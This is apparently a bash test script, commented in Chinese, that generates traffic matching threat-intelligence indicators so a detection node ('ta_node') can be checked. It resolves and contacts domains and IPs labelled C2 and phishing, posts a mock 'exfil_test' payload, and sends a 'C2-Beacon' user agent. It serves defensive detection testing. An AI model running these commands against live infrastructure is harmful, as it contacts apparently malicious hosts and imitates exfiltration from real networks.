#!/usr/bin/env bash
# gen_test_traffic.sh — 生成10条命中IOC的双向网络流量供测试
# 需同时运行: sudo ./ta_node --config ./configs/ta_node.yaml
set -euo pipefail

echo "[1/10] DNS query + HTTP GET: creativecommunityinfo.art (domain, c2)"
dig +short creativecommunityinfo.art A 2>/dev/null || true
curl -s -m 3 -o /dev/null -w "  HTTP %{http_code}\n" http://creativecommunityinfo.art 2>/dev/null || true

echo "[2/10] DNS query + HTTP GET: auramatrixa.com (domain, c2)"
dig +short auramatrixa.com A 2>/dev/null || true
curl -s -m 3 -o /dev/null -w "  HTTP %{http_code}\n" http://auramatrixa.com 2>/dev/null || true

echo "[3/10] DNS query + HTTPS: amazonalert.xyz (domain, phishing)"
dig +short amazonalert.xyz A 2>/dev/null || true
curl -s -m 3 -o /dev/null -w "  HTTP %{http_code}\n" https://amazonalert.xyz 2>/dev/null || true

echo "[4/10] DNS query + HTTP GET: ux.strainedeasily.icu (domain, c2)"
dig +short ux.strainedeasily.icu A 2>/dev/null || true
curl -s -m 3 -o /dev/null -w "  HTTP %{http_code}\n" http://ux.strainedeasily.icu 2>/dev/null || true

echo "[5/10] HTTP GET with User-Agent: mksfuuerwo.live (url, c2)"
curl -s -m 3 -o /dev/null -w "  HTTP %{http_code}\n" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) C2-Beacon" \
  http://mksfuuerwo.live 2>/dev/null || true

echo "[6/10] HTTP POST + response: dodod.lat (url, c2)"
curl -s -m 3 -o /dev/null -w "  HTTP %{http_code}\n" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=abc123&data=exfil_test" \
  http://dodod.lat/win32/i/_ 2>/dev/null || true

echo "[7/10] HTTP GET dual: faeytrdeaw.gu.cc (url, c2)"
curl -s -m 3 -o /dev/null -w "  HTTP %{http_code}\n" \
  -H "Accept: */*" http://faeytrdeaw.gu.cc 2>/dev/null || true

echo "[8/10] TCP SYN + RST: 192.185.86.177:443 (ip, c2)"
timeout 2 nc -z -w 2 192.185.86.177 443 2>/dev/null && echo "  port open" || echo "  port closed"

echo "[9/10] TCP SYN + RST: 104.21.61.3:443 + 80 (ip, c2)"
timeout 2 nc -z -w 2 104.21.61.3 443 2>/dev/null && echo "  port 443 open" || echo "  port 443 closed"
timeout 2 nc -z -w 2 104.21.61.3 80 2>/dev/null && echo "  port 80 open" || echo "  port 80 closed"

echo "[10/10] TCP SYN + RST: 185.117.72.215:443 (ip, c2)"
timeout 2 nc -z -w 2 185.117.72.215 443 2>/dev/null && echo "  port open" || echo "  port closed"

echo ""
echo "=== 流量生成完成 ==="
echo "查看 ta_node 日志: journalctl -u ta_node -f"
echo "或: tail -f /tmp/ta_node.log"
